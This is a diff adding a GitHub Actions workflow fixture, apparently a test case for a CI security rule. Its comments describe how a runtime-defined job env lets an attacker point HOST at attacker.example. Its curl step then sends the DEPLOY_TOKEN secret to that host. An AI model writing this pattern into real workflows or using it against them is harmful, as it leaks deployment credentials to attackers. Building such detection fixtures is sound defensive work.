@@ -1,0 +1,18 @@
+# situation: the job's env is a whole ${{ }}, and a step sends a request
+#   with curl and the secret DEPLOY_TOKEN to the host env.HOST names.
+# reason: what the job's env has is decided at run time.
+# cause: the rule reads an env the workflow writes out.
+# attack: the attacker makes the value attacker.example, where the value
+#   comes from what the attacker writes.
+# attack-run-behavior: curl sends the request with the secret to
+#   attacker.example.
+on: issues
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env: ${{ fromJSON(vars.E) }}
+    steps:
+      - env:
+          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+        run: |
+          curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://${{ env.HOST }}/status"
